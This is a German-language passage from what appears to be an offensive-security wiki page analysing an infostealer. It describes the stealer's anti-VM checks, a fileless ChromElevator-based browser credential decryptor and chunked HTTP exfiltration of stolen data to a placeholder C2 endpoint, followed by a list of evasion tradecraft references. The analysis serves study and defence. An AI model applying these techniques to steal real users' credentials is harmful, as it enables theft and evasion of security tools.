- Variante B untersucht Systemeigenschaften (Mindestanzahl an Prozessen, kürzliche Uptime), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox additions zu erkennen, und führt Timing-Prüfungen rund um Sleeps durch, um Single-Stepping zu erkennen. Jeder Treffer bricht den Vorgang ab, bevor Module gestartet werden.

### Fileless Helper + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE bettet einen Chromium credential helper ein, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird; im fileless-Modus löst er Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine Second-Stage-DLL, die zweimal mit ChaCha20 verschlüsselt wurde (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectively (ohne `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) abgeleitet sind.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden direct-syscall reflective process hollowing, um Code in einen aktiven Chromium-Browser zu injizieren, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkarten direkt aus SQLite-Datenbanken zu entschlüsseln, trotz der ABE-Härtung.


### Modulare In-Memory-Sammlung & chunked HTTP-Exfiltration

- `create_memory_based_log` durchläuft eine globale `memory_generators`-Function-Pointer-Tabelle und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt die Ergebnisse in gemeinsam genutzte Buffer und meldet nach einem Join-Fenster von etwa 45 Sekunden seine Dateianzahl.
- Nach Abschluss wird alles mit der statisch gelinkten `miniz`-Bibliothek als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` schläft anschließend 15 Sekunden und streamt das Archiv in 10-MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) gefälscht wird. Jeder Chunk enthält `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, und der letzte Chunk fügt `complete: true` hinzu, damit der C2 weiß, dass die Reassemblierung abgeschlossen ist.

## References

- [1] [Advanced Evasion Tradecraft: Präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, keine Freipässe mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC für Call-Stack-Spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Obfuscation für DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollte man seinem Zero Trust vertrauen? Umgehung von Zscaler-Posture-Checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Untersuchung der früheren Ransomware-Aktivitäten von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exports von Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) bekämpfen](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzschicht von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum mklink-Befehl](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Unter dem reinen Vorhang: Vom RAT zum Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Entschlüsselung der Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mit API-Tracing besiegen](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Adaptix mit Crystal Palace zu Bett bringen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Vergiftung von Prozessparametern](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET und Stack-Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Sleep-Obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dein .NET-ETW verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Missbrauch von Chrome Remote Desktop bei Red-Team-Operationen: Ein praxisorientierter Leitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
